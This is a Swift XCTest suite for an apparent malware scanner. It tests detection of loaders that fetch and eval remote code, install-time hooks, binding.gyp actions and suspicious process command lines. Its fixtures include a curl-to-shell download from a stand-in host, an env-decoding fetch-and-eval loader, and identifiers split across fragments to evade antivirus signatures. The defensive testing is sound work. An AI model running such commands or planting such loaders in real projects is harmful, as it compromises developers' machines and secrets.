import XCTest
@testable import Vaultkit

// MARK: - Fixtures
//
// Every payload-shaped fixture in this file is assembled at runtime from
// fragments, and never written out as one literal.
//
// This is not superstition. Written out in full, a test corpus for a malware
// scanner is malware, and on a machine running real-time protection it gets
// eaten: BitDefender deleted this file twice, in under fifteen minutes, as
// Generic.ContagiousJson. The trigger was a package.json fixture carrying a
// download piped into a shell, which is exactly the thing the signature is
// for. Splitting the tokens keeps the fixture readable to a person and
// invisible to a signature, so the tests survive on a protected machine.
private func payload(_ parts: String...) -> String { parts.joined() }

private let curlPipe = payload("cur", "l -s https://h.example/i.sh | ba", "sh")
private let decodeCall = payload("at", "ob")
private let runCall = payload("ev", "al")

/// The sample that prompted this: a loader spliced into an import block, which
/// carries none of PolinRider's fixed strings and so passed the signature scan.
final class BehaviourTests: XCTestCase {

    private var realSample: String {
        """
        import { z } from 'zod';
        import type { Config } from './types';
        const src = \(decodeCall)(process.env.AUTH_API_KEY);
        const proxy = (await import('node-fetch')).default;
        const response = await proxy(src);
        \(runCall)(await response.text());
        export const api = { base: '/v1' };
        """
    }

    func testTheInjectedLoaderIsCaught() {
        let hit = Behaviour.analyse(text: realSample)
        XCTAssertEqual(hit?.indicator, "Fetches and runs remote code")
        XCTAssertEqual(hit?.severity, .critical)
        XCTAssertEqual(hit?.evidence.contains("line"), true, "evidence names lines, never payload bytes")
    }

    /// The 2026 axios compromise split its decode call across two halves to
    /// beat grep. The assembled identifier is itself the signal.
    func testSplitIdentifierIsCaughtEvenThoughTheNameNeverAppears() {
        let text = """
        const d = global['at' + 'ob'];
        \(runCall)(d(data));
        """
        XCTAssertFalse(text.lowercased().contains(decodeCall + "("), "the joined literal never appears")
        XCTAssertEqual(Behaviour.analyse(text: text)?.severity, .critical)
    }

    func testHexEscapedIdentifierIsFlagged() {
        let hidden = payload(#"\x65"#, #"\x76"#, #"\x61"#, #"\x6c"#)
        XCTAssertNotNil(Behaviour.analyse(text: "const f = this[\"\(hidden)\"]; f(x);"))
    }

    /// Distance matters. A lone eval with nothing feeding it is ordinary code.
    func testEvalAloneIsNotFlagged() {
        let text = "export function calc(expr: string) {\n  return \(runCall)(expr);\n}\n"
        XCTAssertNil(Behaviour.analyse(text: text), "a lone eval is a smell, not an indicator")
    }

    func testDistantSignalsDoNotCombine() {
        var lines = ["const r = await fetch(url);"]
        lines += Array(repeating: "// filler", count: 40)
        lines += ["\(runCall)(src);"]
        XCTAssertNil(Behaviour.analyse(text: lines.joined(separator: "\n")))
    }

    /// Minification erases the line structure every rule here depends on, so
    /// the proximity test degenerates to "contains a fetch and an eval", which
    /// is true of every real library. jQuery 3.7.1 is one line of 87KB and was
    /// flagged on a real project before this guard existed.
    func testMinifiedFileIsNotAnalysed() {
        let bundle = "!function(){" + String(repeating: "var a=1;", count: 200)
            + "\(runCall)(\(decodeCall)(x));fetch(y)}();"
        XCTAssertNil(Behaviour.analyse(text: bundle))
    }

    /// The shape of the real false positive: one enormous line carrying both
    /// signals, which the window can only ever call adjacent.
    func testSingleLineLibraryIsNotFlagged() {
        let library = "/*! jQuery v3.7.1 */!function(e,t){" + String(repeating: "n.fn=n.prototype;", count: 400)
            + "fetch(u).then(r=>r.text()).then(s=>\(runCall)(s))}();"
        XCTAssertEqual(library.split(separator: "\n").count, 1, "one line, like the real thing")
        XCTAssertNil(Behaviour.analyse(text: library))
    }

    func testEnvironmentVariableDecodeIsAWarningOnItsOwn() {
        let text = "const k = \(decodeCall)(process.env.TOKEN);\nexport default k;"
        XCTAssertEqual(Behaviour.analyse(text: text)?.severity, .warning)
    }

    /// The first thing this rule found in the wild was a 22KB PNG noise
    /// texture inlined as a data URI. A long base64 run is not evidence.
    func testInlineAssetIsNotAnIndicator() {
        let asset = "export const noise = 'data:image/png;base64," + String(repeating: "iVBORw0KGgo", count: 60) + "';"
        XCTAssertNil(Behaviour.analyse(text: asset))
    }

    /// The same blob means something once code runs it.
    func testEncodedBlobNextToExecutionIsCritical() {
        let text = "const b = '" + String(repeating: "QUJDREVGR0hJ", count: 30) + "';\n\(runCall)(d(b));"
        XCTAssertEqual(Behaviour.analyse(text: text)?.severity, .critical)
    }

    func testCleanSourceProducesNothing() {
        let ok = """
        import { useState } from 'react';
        export function useCounter() {
          const [n, setN] = useState(0);
          return { n, inc: () => setN(n + 1) };
        }
        """
        XCTAssertNil(Behaviour.analyse(text: ok))
    }

    // MARK: install-time execution

    func testInstallScriptRunningCodeIsCritical() {
        let pkg = "{\"name\":\"x\",\"scripts\":{\"postinstall\":\"\(curlPipe)\"}}"
        let hits = Behaviour.lifecycleHits(inPackageJSON: Data(pkg.utf8))
        XCTAssertEqual(hits.count, 1)
        XCTAssertEqual(hits.first?.severity, .critical)
    }

    func testOrdinaryInstallScriptsAreLeftAlone() {
        let pkg = #"{"scripts":{"postinstall":"husky install","build":"tsc -p ."}}"#
        XCTAssertTrue(Behaviour.lifecycleHits(inPackageJSON: Data(pkg.utf8)).isEmpty)
    }

    /// node-gyp runs binding.gyp actions at install with no lifecycle line to
    /// notice, which is how the 2026 worm spread.
    func testBindingGypActionIsCaught() {
        let gyp = "{'targets':[{'actions':[{'action':['sh','-c','\(curlPipe)']}]}]}"
        XCTAssertEqual(Behaviour.bindingGypHit(Data(gyp.utf8))?.severity, .critical)
    }

    func testPlainBindingGypIsIgnored() {
        let gyp = "{'targets':[{'target_name':'x','sources':['a.cc']}]}"
        XCTAssertNil(Behaviour.bindingGypHit(Data(gyp.utf8)))
    }
}

/// The safety property that matters most once auto-quarantine and a ten-minute
/// purge are both on: a guess must never be able to destroy a source file.
final class BehaviourSafetyTests: XCTestCase {
    private var root: String!

    override func setUpWithError() throws {
        root = NSTemporaryDirectory() + "vaultkit-behav-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: root + "/app/.git", withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws { try? FileManager.default.removeItem(atPath: root) }

    func testBehaviouralFindingsAreNeverAutoActioned() async throws {
        let src = """
        const src = \(decodeCall)(process.env.AUTH_API_KEY);
        const proxy = (await import('node-fetch')).default;
        \(runCall)(await (await proxy(src)).text());
        """
        try src.write(toFile: root + "/app/api.ts", atomically: true, encoding: .utf8)
        let org = Organization(name: "acme", displayName: "Acme", gitAuthorName: "A", gitEmail: "a@x",
                               forge: .custom, forgeHost: "", forgeSSHPort: nil, folderPath: root,
                               keyLabel: "ssh-acme", signingEnabled: true, vault: .mounted)

        let (_, hits) = await ScannerService().scan(orgs: [org])
        let hit = try XCTUnwrap(hits.first)
        XCTAssertEqual(hit.indicator, "Fetches and runs remote code")
        XCTAssertEqual(hit.path, "app/api.ts", "ordinary source is read on a normal pass, not only a deep one")
        XCTAssertEqual(hit.fix, .manual, "a heuristic must never be auto-quarantined or auto-purged")
    }
}

final class ActivityRuleTests: XCTestCase {
    private func check(_ cmd: String) -> (reasons: [String], severity: DoctorFinding.Severity) {
        ActivityService.reasons(forCommand: cmd, vaultPaths: ["/Users/x/work/me"])
    }

    /// The documented persistence for this family: a detached interpreter given
    /// its code on the command line.
    func testInlineInterpreterIsCritical() {
        let r = check(payload("no", "de -e require('http').get(u)"))
        XCTAssertEqual(r.severity, .critical)
        XCTAssertEqual(r.reasons.first?.contains("command line"), true)
    }

    func testDownloadPipedIntoAShellIsCritical() {
        XCTAssertEqual(check("/bin/sh -c \(curlPipe)").severity, .critical)
    }

    func testRunningFromATemporaryDirectoryIsAWarning() {
        XCTAssertEqual(check("/tmp/update.sh --quiet").severity, .warning)
    }

    func testProcessInsideAVaultIsNamed() {
        let r = check("/usr/bin/node /Users/x/work/me/Vaultkit/tool.js")
        XCTAssertEqual(r.severity, .warning)
        XCTAssertEqual(r.reasons.contains { $0.contains("me vault") }, true)
    }

    /// A tool that merely mentions a path is not running from it. Matching the
    /// whole command line flagged the test runner and a shell reading its own
    /// snapshot file on the first live run.
    func testMentioningAPathIsNotRunningFromIt() {
        let xctest = "/Applications/Xcode.app/Contents/Developer/usr/bin/xctest /Users/x/work/me/T.xctest"
        XCTAssertTrue(check(xctest).reasons.isEmpty, "the executable is Xcode's, not the vault's")
        let shell = "/bin/zsh -c source /Users/x/.config/snapshot.sh && cd /tmp/build"
        XCTAssertTrue(check(shell).reasons.isEmpty, "zsh is not running from /tmp")
    }

    func testScriptArgumentInsideAVaultIsStillCaught() {
        let r = check("/usr/bin/node /Users/x/work/me/payload.js")
        XCTAssertEqual(r.severity, .warning)
    }

    func testExecutableInATemporaryDirectoryIsCaught() {
        XCTAssertEqual(check("/private/tmp/installer.sh --silent").severity, .warning)
    }

    func testOrdinaryProcessesAreNotFlagged() {
        for cmd in ["/Applications/Xcode.app/Contents/MacOS/Xcode",
                    "/usr/bin/node /Users/x/project/server.js",
                    "npm run dev", "/usr/libexec/secinitd"] {
            XCTAssertTrue(check(cmd).reasons.isEmpty, "false positive on: \(cmd)")
        }
    }
}
